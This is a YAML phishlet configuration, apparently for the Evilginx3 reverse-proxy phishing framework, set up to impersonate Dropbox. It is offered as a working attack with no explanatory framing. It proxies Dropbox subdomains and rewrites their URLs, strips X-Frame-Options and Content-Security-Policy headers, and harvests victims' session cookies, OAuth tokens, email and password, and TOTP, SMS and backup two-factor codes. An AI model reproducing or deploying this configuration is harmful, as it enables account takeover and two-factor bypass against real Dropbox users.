min_ver: '3.0.0'
author: 'evilginx3'
redirect_url: 'https://www.dropbox.com/'

proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'dropbox.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'api', orig_sub: 'api', domain: 'dropbox.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'api-content', orig_sub: 'api-content', domain: 'dropbox.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'notify', orig_sub: 'notify', domain: 'dropbox.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'dl', orig_sub: 'dl', domain: 'dropbox.com', session: false, is_landing: false, auto_filter: true}

sub_filters:
  # Replace Dropbox domain URLs
  - {triggers_on: 'www.dropbox.com', orig_sub: 'www', domain: 'dropbox.com', search: 'https://www\\.dropbox\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.dropbox.com', orig_sub: 'api', domain: 'dropbox.com', search: 'https://api\\.dropbox\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.dropbox.com', orig_sub: 'api-content', domain: 'dropbox.com', search: 'https://api-content\\.dropbox\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'www.dropbox.com', orig_sub: 'notify', domain: 'dropbox.com', search: 'https://notify\\.dropbox\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'www.dropbox.com', orig_sub: 'dl', domain: 'dropbox.com', search: 'https://dl\\.dropbox\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript']}
  
  # Remove security headers
  - {triggers_on: 'www.dropbox.com', orig_sub: 'www', domain: 'dropbox.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'www.dropbox.com', orig_sub: 'www', domain: 'dropbox.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'www.dropbox.com', orig_sub: 'api', domain: 'dropbox.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'www.dropbox.com', orig_sub: 'api', domain: 'dropbox.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}

auth_tokens:
  # Primary Dropbox authentication cookies
  - domain: '.dropbox.com'
    keys: ['t', 'db_session', 'db_session_nonce', '__Host-db_session', '__Host-db_session_nonce']
    type: 'cookie'
  
  # Session and security cookies
  - domain: '.dropbox.com'
    keys: ['locale', 'g', 'nsid', 'session_id']
    type: 'cookie'
    optional: true
  
  # OAuth tokens
  - domain: '.dropbox.com'
    keys: ['oauth_token', 'oauth_token_secret', 'access_token', 'refresh_token']
    type: 'cookie'
    optional: true
  
  # User and account cookies
  - domain: '.dropbox.com'
    keys: ['user_id', 'account_id', 'team_id']
    type: 'cookie'
    optional: true

credentials:
  username:
    key: 'login_email'
    search: '(.*)'
    type: 'post'
  
  password:
    key: 'login_password'
    search: '(.*)'
    type: 'post'
  
  # Alternative email field
  email:
    key: 'email'
    search: '(.*)'
    type: 'post'
  
  # 2FA codes
  totp_code:
    key: 'totp_code'
    search: '(.*)'
    type: 'post'
  
  # SMS codes
  sms_code:
    key: 'sms_code'
    search: '(.*)'
    type: 'post'
  
  # Backup codes
  backup_code:
    key: 'backup_code'
    search: '(.*)'
    type: 'post'

auth_urls:
  - '^/home'
  - '^/files'
  - '^/sharing'
  - '^/account'
  - '^/settings'
  - '^/team'

login:
  domain: 'www.dropbox.com'
  path: '/login'

